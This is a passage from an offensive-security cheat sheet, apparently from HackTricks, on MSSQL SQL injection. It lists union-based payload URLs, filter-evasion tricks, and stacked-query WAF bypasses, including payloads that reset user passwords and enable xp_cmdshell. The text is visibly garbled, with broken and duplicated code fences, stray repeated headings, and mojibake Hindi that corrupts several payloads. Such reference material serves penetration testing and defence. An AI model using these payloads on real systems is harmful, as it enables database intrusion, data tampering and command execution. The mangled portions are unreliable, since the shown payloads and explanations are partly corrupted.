https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```

This payload retrieves the version of the MSSQL database.
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
```html
<p>https://vuln.app/getItem?id=0eunion+select+null,@@version,null--</p>

<p>https://vuln.app/getItem?id=0xunion+select+null,@@version,null--</p>
```
```

A period instead of a whitespace between FROM and a column name:

```
### MSSQL Injection

#### Union-Based SQL Injection

To exploit an MSSQL database using union-based SQL injection, you can use the following URL format:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

In this URL:
- `1` is the existing item ID.
- `union select null,@@version,null` is the injection payload that retrieves the MSSQL version.
- `from.users` specifies the table to select data from.
- `--` is a comment to ensure the rest of the original query is ignored.

By analyzing the response from this URL, you can gather information about the MSSQL database.
```

\N separator between SELECT and a throwaway column:

```
### MSSQL Injection

#### Union-Based SQL Injection

To exploit a Union-Based SQL Injection vulnerability in MSSQL, you can use the following payload in the URL parameter:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```

#### рдпреВрдирд┐рдпрди-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди

MSSQL рдореЗрдВ рдпреВрдирд┐рдпрди-рдЖрдзрд╛рд░рд┐рдд SQL рдЗрдиреНрдЬреЗрдХреНрд╢рди рд╡рдирд░рдмрд┐рд▓рд┐рдЯреА рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ URL рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ:

```
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
```sql
SELECT 'a' SELECT 'b'
```
```

So for example, multiple queries such as:

```sql
```
рд╣реИрдХрд░реНрд╕ рдиреЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреНрд╡реЗрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ MSSQL рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рд╣реИ:
```
```

Can be reduced to:

```sql
```sql
USE[tempdb]CREATE/**/TABLE[test]([id]int)INSERT[test]VALUES(1)SELECT[id]FROM[test]DROP/**/TABLE[test]
```
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
рдПрдбрдорд┐рдирд╛'рдпреВрдирд┐рдпрди рд╕реЗрд▓реЗрдХреНрдЯ 1,'рдПрдбрдорд┐рди','testtest123'exec('рд╕реЗрд▓реЗрдХреНрдЯ 1')--

## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
рдПрдбрдорд┐рди'exec('рдЕрдкрдбреЗрдЯ[рдпреВрдЬрд░реНрд╕]рд╕реЗрдЯ[рдкрд╛рд╕рд╡рд░реНрдб]=''a''')--

## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
рдПрдбрдорд┐рди'exec('sp_configure''рд╢реЛ рдПрдбрд╡рд╛рдВрд╕реНрдб рдСрдкреНрд╢рди'',''1''рд░реАрдХрдиреНрдлрд┐рдЧрд░')exec('sp_configure''xp_cmdshell'',''1''рд░реАрдХрдиреНрдлрд┐рдЧрд░')--

## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
